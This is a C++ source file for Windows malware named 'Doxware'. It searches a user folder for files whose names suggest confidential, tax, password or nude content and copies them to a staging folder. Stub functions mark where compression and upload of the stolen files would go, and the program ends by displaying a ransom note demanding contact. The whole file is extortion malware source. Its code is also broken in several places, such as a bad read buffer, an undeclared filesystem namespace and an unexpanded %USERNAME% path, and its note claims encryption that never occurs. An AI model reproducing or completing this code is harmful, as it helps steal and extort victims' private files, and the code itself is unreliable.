#include <windows.h>
#include <fstream>
#include <sstream>
#include <string>
#include <algorithm>
#include <vector>

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "ws2_32.lib")

std::wstring get_system_directory()
{
    wchar_t buffer[MAX_PATH];
    GetSystemDirectoryW(buffer, MAX_PATH);
    return std::wstring(buffer);
}

std::wstring get_appdata_dir()
{
    wchar_t buffer[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, buffer);
    return std::wstring(buffer) + L"\\Doxware";
}

bool is_sensitive_file(const std::wstring& path)
{
    std::wstring keywords[] = {L"confidential", L"tax", L"password", L"nude"};
    for (std::wstring keyword : keywords)
    {
        if (path.find(keyword) != std::string::npos)
            return true;
    }
    return false;
}

void copy_file(const std::wstring& src, const std::wstring& dest)
{
    HANDLE hFile = CreateFileW(src.c_str(), GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    HANDLE hDest = CreateFileW(dest.c_str(), GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, NULL);
    if (hDest == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
        return;
    }

    DWORD bytesRead, bytesWritten;

    while (ReadFile(hFile, src.data(), sizeof(src), &bytesRead, 0))
    {
        WriteFile(hDest, src.data(), bytesRead, &bytesWritten, 0);
    }

    CloseHandle(hFile);
    CloseHandle(hDest);
}

void compress_file(const std::wstring& path)
{
    // TODO: Implement file compression
}

void upload_files(std::vector<std::wstring> files)
{
    // TODO: Implement FTP/HTTP POST or cloud API uploading
}

std::string get_ransom_note()
{
    return "Your sensitive files have been identified and encrypted by Doxware.\n\n"
           "To retrieve your stolen files, contact us at doxware@example.com."
           "\n\nDoxware Team";
}

void main()
{
    std::wstring home_dir = get_system_directory() + L"\\Users\\%USERNAME%\\AppData\\Local";
    std::wstring temp_dir = get_appdata_dir();

    CreateDirectoryW(temp_dir.c_str(), NULL);

    for (const auto& entry : fs::directory_iterator(home_dir))
    {
        if (!entry.is_regular_file())
            continue;

        std::wstring path = entry.path().wstring();
        if (!is_sensitive_file(path))
            continue;

        std::wstring temp_path = temp_dir + L"\\staged_" + entry.path().filename().string() + L".bin";
        copy_file(entry.path(), temp_path);
    }

    // TODO: Compress files

    upload_files(fs::directory_iterator(temp_dir));

    MessageBoxW(NULL, get_ransom_note().c_str(), L"Doxware Ransom Note", MB_OK);

    RemoveDirectory(temp_dir.c_str());
}
